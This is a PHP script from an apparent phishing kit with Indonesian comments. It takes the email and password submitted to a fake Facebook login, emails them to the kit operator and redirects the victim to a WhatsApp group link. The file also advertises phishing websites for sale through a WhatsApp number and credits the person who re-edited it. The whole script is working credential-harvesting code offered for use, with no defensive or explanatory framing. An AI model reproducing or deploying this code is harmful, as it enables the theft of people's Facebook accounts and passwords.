<?php
$email = $_POST['email'];
  $password = $_POST['password'];
  $subject = "= CEPET AMANIN GOBLOK!! = $email";
  $message = '<pre style="font-size: 1.1em;">
  <table>
    <tr>
      <th colspan="3" align="left">SETOR AKUN FACEBOOK</th>
    </tr>
    <tr>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <th colspan="3" align="left">DATA AKUN FACEBOOK</th>
    </tr>
    <tr>
      <td>Email Akun</td>
      <td>:</td>
      <td>'.$email.'</td>
    </tr>
    <tr>
      <td>Password Akun</td>
      <td>:</td>
      <td>'.$password.'</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <th colspan="3" align="left">Terima Kasih</th>
    </tr>
    <tr>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <th colspan="3" align="left">Order Web Phising Whatsapl? Chat aja<a href="http://wa.me/6281212594112">Disini</a>.</th>
    </tr>
    </table>
    </pre>';

    include 'email.php'; // Jangan Apus Yang email.php Tar Ressnya Ga Bakal Kekirim Ke Gmail Lu Goblok!!
    $headersx  = 'MIME-Version: 1.0' . "\r\n";
    $headersx .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
    include'subject.php';
    $datamail = mail($mailto, $subject, $message, $headersx);
    header('location:https://chat.whatsapp.com/I47pQf3bIyX6Q9mxFcE0PZ  ');
    // Reedit By Teh Jus Kelengkeng
    // Subscribe YT TEH JUS